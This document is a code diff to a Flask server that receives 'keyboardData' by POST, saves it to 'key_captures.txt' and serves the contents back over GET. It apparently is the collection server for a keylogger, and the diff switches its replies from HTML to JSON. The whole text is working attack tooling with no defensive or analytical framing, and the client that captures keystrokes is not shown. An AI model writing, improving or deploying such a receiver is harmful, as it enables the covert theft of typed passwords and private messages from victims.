@@ -1,8 +1,6 @@
-from flask import Flask, request, Response
-import os
+from flask import Flask, request, jsonify
 
 app = Flask(__name__)
-port = 8080
 file_path = 'key_captures.txt'
 
 @app.route('/', methods=['GET'])
@@ -10,21 +8,23 @@ def get_data():
     try:
         with open(file_path, 'r', encoding='utf8') as file:
             data = file.read()
-        html_content = f'<h1 style="color: #3366cc;">Captures</h1><p style="color: #009900;">{data.replace("\n", "<br>")}</p>'
-        return Response(html_content, mimetype='text/html')
+        return jsonify({"data": data}), 200
     except FileNotFoundError:
-        return "<h1 style='color: #cc0000;'>Still Capturing......</h1>", 404
+        return jsonify({"error": "File not found, still capturing..."}), 404
 
 @app.route('/', methods=['POST'])
 def post_data():
-    keyboard_data = request.json.get('keyboardData')
-    if keyboard_data is not None:
-        with open(file_path, 'w', encoding='utf8') as file:
-            file.write(keyboard_data)
-        return "Successfully set the data", 200
+    if request.is_json:
+        data = request.json.get('keyboardData', '')
+        if data:
+            with open(file_path, 'w', encoding='utf8') as file:
+                file.write(data)
+            return jsonify({"message": "Successfully set the data"}), 200
+        else:
+            return jsonify({"error": "No 'keyboardData' in request"}), 400
     else:
-        return "Invalid data", 400
+        return jsonify({"error": "Request must be JSON"}), 400
 
 if __name__ == '__main__':
-    print(f"[+] Server is listening on port {port}...")
-    app.run(port=port)
+    print(f"[+] Server is listening on port 8080...")
+    app.run(port=8080)
